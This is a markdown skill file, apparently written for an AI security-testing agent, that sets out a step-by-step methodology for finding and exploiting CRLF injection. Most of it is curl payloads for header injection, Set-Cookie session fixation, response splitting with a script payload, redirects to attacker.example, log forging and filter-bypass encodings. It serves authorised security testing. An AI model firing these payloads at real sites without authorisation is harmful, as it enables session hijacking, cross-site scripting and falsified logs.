---
name: crlf-injection
description: Detect and exploit CRLF injection for HTTP response splitting, header injection, and log forging
origin: AI Threat Hunting
---

# CRLF Injection Testing

## When to Activate

- User input appears in HTTP response headers, redirect locations, or logged fields
- Parameters control redirect URLs, custom response headers, or Set-Cookie values
- Log files include user-controlled input without sanitization

## Tools

- `curl` (manual CRLF injection probing with encoded payloads)
- Browser DevTools (inspect injected response headers)
- OOB callback server (confirm exploitation impact via external request)

## Methodology

### 1. Identify Injection Points
- [ ] Test redirect parameters: `url=`, `next=`, `return=`, `redirect=`, `dest=`
- [ ] Test parameters reflected in response headers (Set-Cookie, Location, custom headers)
- [ ] Test parameters logged to server-side files (usernames, search queries, User-Agent)

### 2. Basic CRLF Header Injection
- [ ] Inject newline sequences to add arbitrary headers
```bash
curl -v "https://target/redirect?url=https://example.com%0d%0aInjected-Header:injected-value"
curl -v "https://target/redirect?url=https://example.com%0D%0ASet-Cookie:session=attacker"
```
- [ ] Verify injected header appears in response using `-v` or DevTools

### 3. HTTP Response Splitting
- [ ] Inject double CRLF to terminate headers and inject body
```bash
curl -v "https://target/redirect?url=test%0d%0a%0d%0a<html><body>Injected</body></html>"
```
- [ ] Inject a full HTTP response
```bash
curl -v "https://target/page?param=value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"
```

### 4. Session Fixation via Set-Cookie Injection
- [ ] Inject Set-Cookie header to fix victim session
```bash
curl -v "https://target/redirect?url=https://target.example%0d%0aSet-Cookie:session=attacker_controlled_value"
curl -v "https://target/redirect?url=https://target.example%0d%0aSet-Cookie:session=abc123;Path=/;HttpOnly"
```

### 5. Location Header Injection
- [ ] Inject Location header for open redirect
```bash
curl -v "https://target/page?param=value%0d%0aLocation:%20https://attacker.example"
```

### 6. Log Injection / Log Forging
- [ ] Inject fake log entries via CRLF in logged parameters
```bash
curl "https://target/login?username=admin%0d%0a[INFO] Login successful for admin from 10.0.0.1"
curl -A "Mozilla/5.0%0d%0a[CRITICAL] Unauthorized access detected" https://target/
```
- [ ] Test if injected log lines could mislead forensic analysis or trigger alerts

### 7. Encoding Variants
- [ ] Standard URL encoding
```
%0d%0a    %0D%0A    %0d%20%0a    %0a    %0d
```
- [ ] Double URL encoding
```
%250d%250a    %250D%250A
```
- [ ] Unicode CRLF sequences
```
%E5%98%8A%E5%98%8D    (UTF-8 encoding of Unicode line separators)
%C4%8D%C4%8A          (alternative UTF-8 sequences)
```
- [ ] Raw characters in contexts that accept them
```
\r\n    \n    \r
```
- [ ] Null byte prefix
```
%00%0d%0a
```

### 8. Filter Bypass Techniques
- [ ] Mixed case and partial encoding
```
%0D%0a    %0d%0A    %0d%0a%20
```
- [ ] Tab and space padding after CRLF
```
%0d%0a%09    %0d%0a%20
```
- [ ] Double CRLF with junk between
```
%0d%0aX-Junk:1%0d%0aInjected:value
```

### 9. HTTP/2 CRLF Injection
- [ ] Test CRLF in pseudo-headers (`:authority`, `:path`)
```bash
curl --http2 -H ":path: /page%0d%0aInjected:value" https://target/
```
- [ ] Test if HTTP/2 to HTTP/1.1 downgrade at proxy preserves injected characters

## What to Record

- Injection point (URL parameter, header, logged field)
- Exact payload including encoding variant that succeeded
- Evidence of injected header in response (curl -v output or DevTools screenshot)
- Impact: session fixation, XSS via response splitting, open redirect, log forging
- Whether filter bypass was required and which encoding worked
- Full request/response for reproducibility

## Extended Resources

- `agent/references/vuln-checklists/A05-injection.md` — OWASP Top 10:2025 injection checklist
